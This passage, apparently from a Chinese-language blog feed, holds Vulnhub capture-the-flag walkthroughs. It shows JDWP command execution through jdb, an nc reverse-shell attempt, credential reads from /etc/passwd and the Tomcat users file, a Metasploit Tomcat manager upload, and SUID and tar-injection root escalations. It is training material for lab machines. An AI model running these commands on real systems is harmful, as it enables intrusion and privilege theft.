drwxr-xr-x <span class="m">3</span> rene rene   <span class="m">4096</span> Jul  <span class="m">6</span> 07:42 ..
-rw-r--r-- <span class="m">1</span> rene rene <span class="m">124078</span> Dec <span class="m">23</span> 05:00 backup.tar.gz
-rw-r--r-- <span class="m">1</span> rene rene  <span class="m">26558</span> Dec <span class="m">23</span> 05:02 sys-12512.BAK
-rw-r--r-- <span class="m">1</span> rene rene  <span class="m">11402</span> Dec <span class="m">23</span> 05:01 sys-23924.BAK
-rw-r--r-- <span class="m">1</span> rene rene   <span class="m">7231</span> Dec <span class="m">23</span> 05:04 sys-2448.BAK
-rw-r--r-- <span class="m">1</span> rene rene  <span class="m">27182</span> Dec <span class="m">23</span> 05:03 sys-5018.BAK</code></pre></div>


<p>backup目錄看起來每隔一分鐘就會生出一個檔案，每五分鐘就會打包一包backup.tar.gz</p>

<p>推測是有在跑cron，剛好/etc/crontab也可以讀取，就來看看cron的設定</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c"># /etc/crontab: system-wide crontab</span>
<span class="c"># Unlike any other crontab you don&#39;t have to run the `crontab&#39;</span>
<span class="c"># command to install the new version when you edit this file</span>
<span class="c"># and files in /etc/cron.d. These files also have username fields,</span>
<span class="c"># that none of the other crontabs do.</span>

<span class="nv">SHELL</span><span class="o">=</span>/bin/sh
<span class="nv">PATH</span><span class="o">=</span>/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

<span class="c"># m h dom mon dow user  command</span>
<span class="m">17</span> *    * * *   root    <span class="nb">cd</span> / <span class="o">&amp;&amp;</span> run-parts --report /etc/cron.hourly
<span class="m">25</span> <span class="m">6</span>    * * *   root    <span class="nb">test</span> -x /usr/sbin/anacron <span class="o">||</span> <span class="o">(</span> <span class="nb">cd</span> / <span class="o">&amp;&amp;</span> run-parts --report /etc/cron.daily <span class="o">)</span>
<span class="m">47</span> <span class="m">6</span>    * * <span class="m">7</span>   root    <span class="nb">test</span> -x /usr/sbin/anacron <span class="o">||</span> <span class="o">(</span> <span class="nb">cd</span> / <span class="o">&amp;&amp;</span> run-parts --report /etc/cron.weekly <span class="o">)</span>
<span class="m">52</span> <span class="m">6</span>    <span class="m">1</span> * *   root    <span class="nb">test</span> -x /usr/sbin/anacron <span class="o">||</span> <span class="o">(</span> <span class="nb">cd</span> / <span class="o">&amp;&amp;</span> run-parts --report /etc/cron.monthly <span class="o">)</span>
<span class="c">#</span>
* * * * * root /root/create_backup.sh
*/5 * * * * root /usr/bin/compress.sh</code></pre></div>


<p>只能看到/usr/bin/compress.sh的內容</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">cat compress.sh
<span class="c">#!/bin/sh</span>

rm -f /home/rene/backup/backup.tar.gz
<span class="nb">cd</span> /home/rene/backup
tar cfz /home/rene/backup/backup.tar.gz *
chown rene:rene /home/rene/backup/backup.tar.gz
rm -f /home/rene/backup/*.BAK</code></pre></div>


<p>這邊PATH的設定方式沒辦法達到替換指令的效果</p>

<p>看來只能<a href="http://www.net-security.org/article.php?id=2061">靠tar來做command injection</a>了</p>

<p>於是直接給/bin/sh加上了stickybit</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">echo</span> <span class="s2">&quot;chmod u+s /bin/sh&quot;</span> &gt; shell.sh</code></pre></div>


<p>等時間一到就可以拿到root的權限了</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c"># sh</span>
sh
<span class="c"># id</span>
id
<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
<span class="c"># cat /root/flag.txt</span>
cat /root/flag.txt
                                                                   .aMMMMMMMMn.  ,aMMMMn.
                                                                 .aMccccccccc*YMMn.    <span class="sb">`</span>Mb
                                                                aMccccccccccccccc*Mn    MP
                                                               .AMMMMn.   MM <span class="sb">`</span>*YMMY*ccaM*
                                                              dM*  *YMMb  YP        <span class="sb">`</span>cMY
                                                              YM.  .dMMP   aMn.     .cMP
                                                               *YMMn.     aMMMMMMMMMMMY<span class="s1">&#39;</span>
<span class="s1">                                                                .&#39;</span>YMMb.           ccMP
                                                             .dMcccccc*Mc....cMb.cMP<span class="s1">&#39;</span>
<span class="s1">                                                           .dMMMMb;cccc*Mbcccc,IMMMMMMMn.</span>
<span class="s1">                                                          dY*&#39;</span>  <span class="s1">&#39;*M;ccccMM..dMMM..MP*cc*Mb</span>
<span class="s1">                                                          YM.    ,MbccMMMMMMMMMMMM*cccc;MP</span>
<span class="s1">                                                           *Mbn;adMMMMMMMMMMMMMMMIcccc;M*</span>
<span class="s1">                                                          dPcccccIMMMMMMMMMMMMMMMMa;c;MP</span>
<span class="s1">                                                          Yb;cc;dMMMMMMMMMMMP*&#39;</span>  *YMMP*
                                                           *YMMMPYMMMMMMP*<span class="s1">&#39;          curchack</span>
<span class="s1">                                                       +####################################+</span>
<span class="s1">                                                       |======                            | |</span>
<span class="s1">                                                       |======                            | |</span>
<span class="s1">                                                       |======                            | |</span>
<span class="s1">                                                       |======                            | |</span>
<span class="s1">                                                       |======                            | |</span>
<span class="s1">                                                       +----------------------------------+-+</span>
<span class="s1">                                                        ####################################</span>
<span class="s1">                                                             |======                  |</span>
<span class="s1">                                                             |======                  |</span>
<span class="s1">                                                             |=====                   |</span>
<span class="s1">                                                             |====                    |</span>
<span class="s1">                                                             |                        |</span>
<span class="s1">                                                             +                        +</span>

<span class="s1"> .d8888b.                 d8b          d8b               888                                                                    d8b</span>
<span class="s1">d88P  Y88b                Y8P          88P               888                                                                    Y8P</span>
<span class="s1">888    888                             8P                888</span>
<span class="s1">888        .d88b.  .d8888b888   88888b.&quot;  .d88b. .d8888b 888888   88888b.  8888b. .d8888b    888  88888888b.  .d88b.    88888b. 88888888b.  .d88b.</span>
<span class="s1">888       d8P  Y8bd88P&quot;   888   888 &quot;88b d8P  Y8b88K     888      888 &quot;88b    &quot;88b88K        888  888888 &quot;88bd8P  Y8b   888 &quot;88b888888 &quot;88bd8P  Y8b</span>
<span class="s1">888    88888888888888     888   888  888 88888888&quot;Y8888b.888      888  888.d888888&quot;Y8888b.   888  888888  88888888888   888  888888888  88888888888</span>
<span class="s1">Y88b  d88PY8b.    Y88b.   888   888  888 Y8b.         X88Y88b.    888 d88P888  888     X88   Y88b 888888  888Y8b.       888 d88P888888 d88PY8b.   d8b</span>
<span class="s1"> &quot;Y8888P&quot;  &quot;Y8888  &quot;Y8888P888   888  888  &quot;Y8888  88888P&#39;</span> <span class="s2">&quot;Y888   88888P&quot;</span> <span class="s2">&quot;Y888888 88888P&#39;    &quot;</span>Y88888888  <span class="m">888</span> <span class="s2">&quot;Y8888    88888P&quot;</span> 88888888P<span class="s2">&quot;  &quot;</span>Y8888Y8P
                                                                  <span class="m">888</span>                                                   <span class="m">888</span>        888
                                                                  <span class="m">888</span>                                                   <span class="m">888</span>        888
                                                                  <span class="m">888</span>                                                   <span class="m">888</span>        888
Well Done!
Here<span class="err">&#39;</span>s your flag: 0089cd4f9ae79402cdd4e7b8931892b7</code></pre></div>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[/dev/random: Sleepy]]></title>
    <link href="http://newdominic.github.io/blog/2015/12/20/sleepy/"/>
    <updated>2015-12-20T16:57:45+08:00</updated>
    <id>http://newdominic.github.io/blog/2015/12/20/sleepy</id>
    <content type="html"><![CDATA[<p><a href="https://www.vulnhub.com/entry/devrandom-sleepy,123/">/dev/random: Sleepy</a> from <a href="https://www.vulnhub.com/">Vulnhub</a></p>

<!--more-->


<hr />

<p>nmap掃描結果如下</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/Security/sleepy# nmap -n -T5 192.168.0.117 --top-ports<span class="o">=</span><span class="m">5000</span> -A

Starting Nmap 6.49BETA4 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2015-12-19 23:46 CST
Warning: 192.168.0.117 giving up on port because retransmission cap hit <span class="o">(</span>2<span class="o">)</span>.
Nmap scan report <span class="k">for</span> 192.168.0.117
Host is up <span class="o">(</span>0.00032s latency<span class="o">)</span>.
Not shown: <span class="m">4250</span> filtered ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.0.8 or later
<span class="p">|</span> ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
<span class="p">|</span>_Can<span class="err">&#39;</span>t get directory listing: TIMEOUT
8009/tcp open  ajp13   Apache Jserv <span class="o">(</span>Protocol v1.3<span class="o">)</span>
<span class="p">|</span>_ajp-methods: Failed to get a valid response <span class="k">for</span> the OPTION request
9001/tcp open  jdwp    Java Debug Wire Protocol <span class="o">(</span>Reference Implementation<span class="o">)</span> version 1.6 1.7.0_71
MAC Address: 08:00:27:79:0F:C3 <span class="o">(</span>Cadmus Computer Systems<span class="o">)</span>
Warning: OSScan results may be unreliable because we could not find at least <span class="m">1</span> open and <span class="m">1</span> closed port
Device <span class="nb">type</span>: general purpose
Running: Linux 2.6.X<span class="p">|</span>3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.10, Linux 2.6.32 - 3.13
Network Distance: <span class="m">1</span> hop

TRACEROUTE
HOP RTT     ADDRESS
<span class="m">1</span>   0.31 ms 192.168.0.117

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 58.34 seconds</code></pre></div>


<p>用anonymous登入ftp後只拿到一張看起來沒有線索的jpg檔，暫時先放到一邊</p>

<p>另外還開了兩個還沒遇過的port，用nc連過去都沒甚麼回應，先google一下一般開啟這兩個port的用途</p>

<p>port 8009大部分的用途是，<a href="https://en.wikipedia.org/wiki/Apache_JServ_Protocol">Apache JServ Protocol</a></p>

<p>說不定自己架一個apache server再proxy過去就能看到網頁了</p>

<p>不過要使用這個功能必須先安裝 libapache2-mod-jk</p>

<p>安裝後再<a href="https://rimuhosting.com/mod_jk2_and_mod_proxy_ajp.jsp">設定</a>讓自己的Apache Server proxy到目標ip後，用瀏覽器就能看到架好的Tomcat Server了</p>

<p><img class="center" src="http://newdominic.github.io/images/2015-12-20-sleepy/tomcat.png"></p>

<p>連上後先嘗試登入tomcat的管理介面</p>

<p>不過試了很多組密碼都沒有用，用dirbuster也沒找到可疑的目錄，只能暫時擱置，來看另一個開啟的port</p>

<p>port 9001通常用於<a href="http://docs.oracle.com/javase/7/docs/technotes/guides/jpda/jdwp-spec.html">Java Debug Wire Protocol</a>，可以讓使用者遠端debug JVM</p>

<p>首先找到這篇<a href="http://blog.ioactive.com/2014/04/hacking-java-debug-wire-protocol-or-how.html">文章</a>，大意是可以透過連入JDWP達到Remote code execution的效果</p>

<p>不過實際拿他的exploit來用(metasploit其實也有內建exploit了)，發現很難猜到目標有使用的物件，繼續再找找有沒有替代方案</p>

<p>再來找到<a href="https://www.exploit-db.com/papers/27179/">這篇</a>：直接用jdb attach到目標後中斷程式，藉由建立新的物件達到執行命令的效果</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/Security/sleepy# jdb -attach 192.168.0.117:9001
Set uncaught java.lang.Throwable
Set deferred uncaught java.lang.Throwable
Initializing jdb ...
&gt;</code></pre></div>


<p>很順利地連上之後，先想辦法讓程式中斷</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">&gt; threads
Group system:
  <span class="o">(</span>java.lang.ref.Reference<span class="nv">$ReferenceHandler</span><span class="o">)</span>0x19d Reference Handler cond. waiting
  <span class="o">(</span>java.lang.ref.Finalizer<span class="nv">$FinalizerThread</span><span class="o">)</span>0x19e  Finalizer         cond. waiting
  <span class="o">(</span>java.lang.Thread<span class="o">)</span>0x19f                         Signal Dispatcher running
Group main:
  <span class="o">(</span>java.lang.Thread<span class="o">)</span>0x1a1                         main              sleeping
&gt; interrupt 0x1a1
&gt;
Exception occurred: java.lang.InterruptedException <span class="o">(</span>uncaught<span class="o">)</span><span class="s2">&quot;thread=main&quot;</span>, java.lang.Thread.sleep<span class="o">()</span>, <span class="nv">line</span><span class="o">=</span>-1 <span class="nv">bci</span><span class="o">=</span>-1

main<span class="o">[</span>1<span class="o">]</span></code></pre></div>


<p>來試試讓目標彈一個reverse shell回來</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">main<span class="o">[</span>1<span class="o">]</span>  print new java.lang.Runtime<span class="o">()</span>.exec<span class="o">(</span><span class="s2">&quot;nc 192.168.0.115 12345 -e /bin/sh&quot;</span><span class="o">)</span>                                         com.sun.tools.example.debug.expr.ParseException: Unable to create java.lang.Runtime instance
 new java.lang.Runtime<span class="o">()</span>.exec<span class="o">(</span><span class="s2">&quot;nc 192.168.0.115 12345 -e /bin/sh&quot;</span><span class="o">)</span> <span class="o">=</span> null</code></pre></div>


<p>失敗。接著換其他指令試試看</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">main<span class="o">[</span>1<span class="o">]</span> print new java.lang.Runtime<span class="o">()</span>.exec<span class="o">(</span><span class="s2">&quot;cat /etc/passwd&quot;</span><span class="o">)</span>
 new java.lang.Runtime<span class="o">()</span>.exec<span class="o">(</span><span class="s2">&quot;cat /etc/passwd&quot;</span><span class="o">)</span> <span class="o">=</span> <span class="s2">&quot;java.lang.UNIXProcess@6a059fa4&quot;</span></code></pre></div>


<p>看起來有成功產生物件，但卻看不到內容，稍微研究一下要怎麼<a href="http://stackoverflow.com/questions/4741878/redirect-runtime-getruntime-exec-output-with-system-setout">顯示exec的輸出</a>，拼湊出了下面這難看的解法</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">main<span class="o">[</span>1<span class="o">]</span> print new java.lang.String<span class="o">(</span>new java.io.BufferedReader<span class="o">(</span>new java.io.InputStreamReader<span class="o">(</span>new java.lang.Runtime<span class="o">()</span>.exec<span class="o">(</span><span class="s2">&quot;cat /etc/passwd&quot;</span><span class="o">)</span>.getInputStream<span class="o">()))</span>.readLine<span class="o">())</span>
 new java.lang.String<span class="o">(</span>new java.io.BufferedReader<span class="o">(</span>new java.io.InputStreamReader<span class="o">(</span>new java.lang.Runtime<span class="o">()</span>.exec<span class="o">(</span><span class="s2">&quot;cat /etc/passwd&quot;</span><span class="o">)</span>.getInputStream<span class="o">()))</span>.readLine<span class="o">())</span> <span class="o">=</span> <span class="s2">&quot;root:x:0:0:root:/root:/bin/bash&quot;</span></code></pre></div>


<p>但是用這方法實在很難操作，後來想到可以找看看tomcat的管理帳密</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">main<span class="o">[</span>1<span class="o">]</span> print new java.lang.String<span class="o">(</span>new java.io.BufferedReader<span class="o">(</span>new java.io.InputStreamReader<span class="o">(</span>new java.lang.Runtime<span class="o">()</span>.exec<span class="o">(</span><span class="s2">&quot;tail -n 1 /etc/tomcat/tomcat-users.xml&quot;</span><span class="o">)</span>.getInputStream<span class="o">()))</span>.readLine<span class="o">())</span>
 new java.lang.String<span class="o">(</span>new java.io.BufferedReader<span class="o">(</span>new java.io.InputStreamReader<span class="o">(</span>new java.lang.Runtime<span class="o">()</span>.exec<span class="o">(</span><span class="s2">&quot;tail -n 1 /etc/tomcat/tomcat-users.xml&quot;</span><span class="o">)</span>.getInputStream<span class="o">()))</span>.readLine<span class="o">())</span> <span class="o">=</span> <span class="s2">&quot;&lt;/tomcat-users&gt;&quot;</span>
main<span class="o">[</span>1<span class="o">]</span> print new java.lang.String<span class="o">(</span>new java.io.BufferedReader<span class="o">(</span>new java.io.InputStreamReader<span class="o">(</span>new java.lang.Runtime<span class="o">()</span>.exec<span class="o">(</span><span class="s2">&quot;tail -n 2 /etc/tomcat/tomcat-users.xml&quot;</span><span class="o">)</span>.getInputStream<span class="o">()))</span>.readLine<span class="o">())</span>
 new java.lang.String<span class="o">(</span>new java.io.BufferedReader<span class="o">(</span>new java.io.InputStreamReader<span class="o">(</span>new java.lang.Runtime<span class="o">()</span>.exec<span class="o">(</span><span class="s2">&quot;tail -n 2 /etc/tomcat/tomcat-users.xml&quot;</span><span class="o">)</span>.getInputStream<span class="o">()))</span>.readLine<span class="o">())</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
main<span class="o">[</span>1<span class="o">]</span> print new java.lang.String<span class="o">(</span>new java.io.BufferedReader<span class="o">(</span>new java.io.InputStreamReader<span class="o">(</span>new java.lang.Runtime<span class="o">()</span>.exec<span class="o">(</span><span class="s2">&quot;tail -n 3 /etc/tomcat/tomcat-users.xml&quot;</span><span class="o">)</span>.getInputStream<span class="o">()))</span>.readLine<span class="o">())</span>
 new java.lang.String<span class="o">(</span>new java.io.BufferedReader<span class="o">(</span>new java.io.InputStreamReader<span class="o">(</span>new java.lang.Runtime<span class="o">()</span>.exec<span class="o">(</span><span class="s2">&quot;tail -n 3 /etc/tomcat/tomcat-users.xml&quot;</span><span class="o">)</span>.getInputStream<span class="o">()))</span>.readLine<span class="o">())</span> <span class="o">=</span> <span class="s2">&quot;&lt;user username=&quot;</span>sl33py<span class="s2">&quot; password=&quot;</span>Gu3SSmYStR0NgPa<span class="nv">$sw0rD</span>!<span class="s2">&quot; roles=&quot;</span>tomcat,manager-gui,admin-gui,admin,manager-jmx,admin-script,manager,manager-script,manager-status<span class="s2">&quot;/&gt;&quot;</span></code></pre></div>


<p>帳號是 sl33py，密碼是 Gu3SSmYStR0NgPa$sw0rD。成功登入tomcat管理介面！</p>

<p><img class="center" src="http://newdominic.github.io/images/2015-12-20-sleepy/manager.png"></p>

<p>前面在研究tomcat密碼設定的過程中看到一篇<a href="http://roach0426.pixnet.net/blog/post/965149-tomcat%E5%85%A5%E4%BE%B5%E6%94%BB%E9%98%B2%E6%88%B0">文章</a>：有人的伺服器被打入管理介面後塞了一個.war檔進去。</p>

<p>所以就先從file upload+code execution的方向去找exploit</p>

<p>在kali下用searchsploit找看看</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~# searchsploit tomcat  <span class="p">|</span>  grep Upload
Apache Tomcat Manager - Application Upload Authenticated Code Execution                       <span class="p">|</span> ./multiple/remote/31433.rb
Apache Commons FileUpload and Apache Tomcat - Denial-of-Service                               <span class="p">|</span> ./multiple/dos/31615.rb</code></pre></div>


<p>第一個看起來有點像是我們想要東西，而要實際操作這個exploit必須要使用metasploit</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~# msfconsole -q
msf &gt; search tomcat
...
exploit/multi/http/tomcat_mgr_upload                         2009-11-09       excellent  Apache Tomcat Manager Authenticated Upload Code Execution
msf &gt; use exploit/multi/http/tomcat_mgr_upload
msf exploit<span class="o">(</span>tomcat_mgr_upload<span class="o">)</span> &gt;</code></pre></div>


<p>設定好之後用show options檢查一下</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">PASSWORD   Gu3SSmYStR0NgPa<span class="nv">$sw0rD</span>!  no        The password <span class="k">for</span> the specified username
  Proxies                            no        A proxy chain of format <span class="nb">type</span>:host:port<span class="o">[</span>,type:host:port<span class="o">][</span>...<span class="o">]</span>
  RHOST      127.0.0.1               yes       The target address
  RPORT      <span class="m">80</span>                      yes       The target port
  TARGETURI  /manager                yes       The URI path of the manager app <span class="o">(</span>/html/upload and /undeploy will be used<span class="o">)</span>
  USERNAME   sl33py                  no        The username to authenticate as
  VHOST                              no        HTTP server virtual host</code></pre></div>


<p>設定沒問題就給他run下去！成功拿到meterpreter的shell！</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">msf exploit<span class="o">(</span>tomcat_mgr_upload<span class="o">)</span> &gt; run

<span class="o">[</span>*<span class="o">]</span> Started reverse handler on 192.168.0.115:12333
<span class="o">[</span>*<span class="o">]</span> 127.0.0.2:80 - Retrieving session ID and CSRF token...
<span class="o">[</span>*<span class="o">]</span> 127.0.0.2:80 - Uploading and deploying 9Vw90ot2DD7eS...
<span class="o">[</span>*<span class="o">]</span> 127.0.0.2:80 - Executing 9Vw90ot2DD7eS...
<span class="o">[</span>*<span class="o">]</span> 127.0.0.2:80 - Undeploying 9Vw90ot2DD7eS ...
<span class="o">[</span>*<span class="o">]</span> Transmitting intermediate stager <span class="k">for</span> over-sized stage...<span class="o">(</span><span class="m">105</span> bytes<span class="o">)</span>
<span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">1495598</span> bytes<span class="o">)</span> to 192.168.0.117
<span class="o">[</span>*<span class="o">]</span> Meterpreter session <span class="m">1</span> opened <span class="o">(</span>192.168.0.115:12333 -&gt; 192.168.0.117:37622<span class="o">)</span> at 2015-12-21 00:25:56 +0800

meterpreter &gt;</code></pre></div>


<p>稍微研究一下目標電腦，會知道裡面有個叫sleepy的使用者，而且有個能夠以tomcat身分執行的suid程式</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">sh-4.2<span class="nv">$ </span>cat /etc/passwd
...
sleepy:x:1002:1002::/home/sleepy:/bin/bash
sh-4.2<span class="nv">$ </span><span class="k">for</span> i in <span class="k">$(</span>find / -perm -4000 2&gt;/dev/null<span class="k">)</span><span class="p">;</span> <span class="k">do</span> ls -al <span class="nv">$i</span><span class="p">;</span> <span class="k">done</span>
...
-rwsr-s---. <span class="m">1</span> root tomcat <span class="m">8669</span> Jan <span class="m">18</span>  <span class="m">2015</span> /usr/bin/nightmare</code></pre></div>


<p>而實際執行後會跳出錯誤訊息</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">sh-4.2<span class="nv">$ </span>/usr/bin/nightmare
<span class="o">[</span>-<span class="o">]</span> error: no tty present</code></pre></div>


<p>要tty是吧，試試看能不能用pty<a href="http://stackoverflow.com/questions/1401002/trick-an-application-into-thinking-its-stdin-is-interactive-not-a-pipe">騙一下</a></p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">sh-4.2<span class="nv">$ </span>python -c <span class="s1">&#39;import pty;pty.spawn(&quot;/bin/bash&quot;);&#39;</span>
bash-4.2<span class="nv">$ </span>/usr/bin/nightmare
/usr/bin/nightmare
Error opening terminal: unknown.
<span class="o">[</span>+<span class="o">]</span> Again <span class="o">[</span>y/n<span class="o">]</span>?</code></pre></div>


<p>看來不能用騙的，最後只好把程式丟回kali分析看看</p>

<p>程式的架構大概是像下面這樣</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">void main<span class="o">()</span>
<span class="o">{</span>
    memset<span class="o">(</span>var_a, 0x0, 0x98<span class="o">)</span><span class="p">;</span>
    sigaction<span class="o">(</span>0x2, 0x40081f, 0<span class="o">)</span><span class="p">;</span>
    sigaction<span class="o">(</span>0xf, 0x40081f, 0<span class="o">)</span><span class="p">;</span>
    <span class="k">if</span> <span class="o">(</span>open<span class="o">(</span><span class="s2">&quot;/dev/tty&quot;</span>, 0x2<span class="o">)</span> <span class="o">==</span> -1<span class="o">)</span> <span class="o">{</span>
        puts <span class="o">(</span><span class="s2">&quot;[-] error: no tty present&quot;</span><span class="o">)</span><span class="p">;</span>
    <span class="o">}</span>
    <span class="k">else</span> <span class="o">{</span>
        fire<span class="o">()</span><span class="p">;</span>
        <span class="k">while</span> <span class="o">(</span>1<span class="o">)</span> <span class="o">{</span>
            <span class="nb">printf</span> <span class="o">(</span><span class="s2">&quot;[+] Again [y/n]?&quot;</span><span class="o">)</span><span class="p">;</span>
            <span class="nv">var_b</span> <span class="o">=</span> getchar <span class="o">()</span><span class="p">;</span>
            <span class="k">if</span> <span class="o">(</span><span class="nv">var_b</span> <span class="o">==</span> <span class="s1">&#39;y&#39;</span> or <span class="nv">var_b</span> <span class="o">==</span> <span class="s1">&#39;Y&#39;</span><span class="o">)</span> <span class="o">{</span>
                fire<span class="o">()</span><span class="p">;</span>
            <span class="o">}</span>
            <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="nv">var_b</span> <span class="o">==</span> <span class="s1">&#39;n&#39;</span> <span class="o">||</span> <span class="nv">var_b</span> <span class="o">==</span> <span class="s1">&#39;N&#39;</span><span class="o">)</span> <span class="o">{</span>
                puts <span class="o">(</span><span class="s2">&quot;Oops.. &#39;n&#39; is broken&quot;</span><span class="o">)</span><span class="p">;</span>
            <span class="o">}</span>
        <span class="o">}</span><span class="p">;</span>
    <span class="o">}</span>
<span class="o">}</span>

void fire <span class="o">()</span>
<span class="o">{</span>
    system<span class="o">(</span><span class="s2">&quot;/usr/bin/aafire&quot;</span><span class="o">)</span><span class="p">;</span>
<span class="o">}</span></code></pre></div>


<p>再來是sigaction所指定的函式</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">void sigHandler <span class="o">()</span>
<span class="o">{</span>
    train<span class="o">()</span><span class="p">;</span>
    <span class="nb">exit</span><span class="o">(</span>0<span class="o">)</span><span class="p">;</span>
<span class="o">}</span>

void train <span class="o">()</span>
<span class="o">{</span>
    setresuid <span class="o">(</span>0, 0, 0, 0<span class="o">)</span><span class="p">;</span>
    setresgid <span class="o">(</span>0, 0, 0, 0<span class="o">)</span><span class="p">;</span>
    system <span class="o">(</span><span class="s2">&quot;/usr/bin/sl -al&quot;</span><span class="o">)</span><span class="p">;</span>
<span class="o">}</span></code></pre></div>


<p>既然用到了setresuid和setresgid，看來是希望我們對/usr/bin/sl操作來達到提權的目的</p>

<p>花了一段時間，最後用&#8221;replace path to binary&#8221;當關鍵字找到一個神奇的<a href="http://serverfault.com/questions/548320/override-path-to-binary-for-particular-user">解法</a></p>

<p>程式內用sigaction設定了當遇到SIGINT(0x2)和SIGTERM(0xf)時要進入sigHandler</p>

<p>不過因為現在是用meterpreter建的shell，如果下Ctrl+C的話，SIGINT指令會被meterpreter吃掉</p>

<p>只能再建另一個session，用kill -2或-15把signal送出後就拿到root了</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">bash-4.2<span class="nv">$ </span>/usr/bin/nightmare
/usr/bin/nightmare
Error opening terminal: unknown.
<span class="o">[</span>+<span class="o">]</span> Again <span class="o">[</span>y/n<span class="o">]</span>? bash-4.2# id
id
<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,91<span class="o">(</span>tomcat<span class="o">)</span> <span class="nv">context</span><span class="o">=</span>system_u:system_r:tomcat_t:s0
bash-4.2#</code></pre></div>


<p>/root/flag.txt是超佔畫面的的七個小矮人，就不放了</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[The Wall: 1]]></title>
    <link href="http://newdominic.github.io/blog/2015/12/19/the_wall_1/"/>
    <updated>2015-12-19T17:57:45+08:00</updated>
    <id>http://newdominic.github.io/blog/2015/12/19/the_wall_1</id>
    <content type="html"><![CDATA[<p><a href="https://www.vulnhub.com/entry/the-wall-1,130/">The Wall 1</a> from <a href="https://www.vulnhub.com/">Vulnhub</a></p>

<!--more-->


<hr />

<p>首先用nmap掃描目標ip，會發現完全沒有對外開放的por</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/Security/wall# nmap -n -p- -T5 192.168.0.116
...
All <span class="m">65535</span> scanned ports on 192.168.0.116 are filtered</code></pre></div>


<p>找不到對外的開口，只好來看看目標有沒有對外發送甚麼訊息</p>

<p>開啟wireshark後針對目標ip設定filter</p>

<p><img class="center" src="http://newdominic.github.io/images/2015-12-19-thewall-1/1337.png"></p>

<p>發現每10秒左右會收到該目標要求跟攻擊端電腦的port 1337連線</p>

<p>就來監聽一下port 1337，看看對方送甚麼內容</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/Security/wall# nc -lp 1337

                       .u!<span class="s2">&quot;`</span>
<span class="s2">                   .x*&quot;</span><span class="sb">`</span>
               ..+<span class="s2">&quot;NP</span>
<span class="s2">            .z&quot;&quot;   ?</span>
<span class="s2">          M#`      9     ,     ,</span>
<span class="s2">                   9 M  d! ,8P&#39;</span>
<span class="s2">                   R X.:x&#39; R&#39;  ,</span>
<span class="s2">                   F F&#39; M  R.d&#39;</span>
<span class="s2">                   d P  @  E`  ,</span>
<span class="s2">      ss           P  &#39;  P  N.d&#39;</span>
<span class="s2">       x         &#39;&#39;        &#39;</span>
<span class="s2">       X               x             .</span>
<span class="s2">       9     .f       !         .    $b</span>
<span class="s2">       4;    $k      /         dH    $f</span>
<span class="s2">       &#39;X   ;$$     z  .       MR   :$</span>
<span class="s2">        R   M$$,   :  d9b      M&#39;   tM</span>
<span class="s2">        M:  #&#39;$L  ;&#39; M `8      X    MR</span>
<span class="s2">        `$;t&#39; $F  # X ,oR      t    Q;</span>
<span class="s2">         $$@  R$ H :RP&#39; $b     X    @&#39;</span>
<span class="s2">         9$E  @Bd&#39; $&#39;   ?X     ;    W</span>
<span class="s2">         `M&#39;  `$M d$    `E    ;.o* :R   ..</span>
<span class="s2">          `    &#39;  &quot;</span><span class="s1">&#39;     &#39;</span>    @<span class="s1">&#39;   &#39;</span><span class="nv">$o</span>*<span class="err">&quot;</span><span class="s1">&#39;</span>

<span class="s1">              The Wall by @xerubus</span>
<span class="s1">          -= Welcome to the Machine =-</span>


<span class="s1">If you should go skating on the thin ice of modern life, dragging behind you the </span>
<span class="s1">silent reproach of a million tear-stained eyes, don&#39;</span>t be surprised when a crack 
in the ice appears under your feet. - Pink Floyd, The Thin Ice</code></pre></div>


<p>收到一條歡迎訊息，看起來只是Pink Floyd的歌詞&hellip;</p>

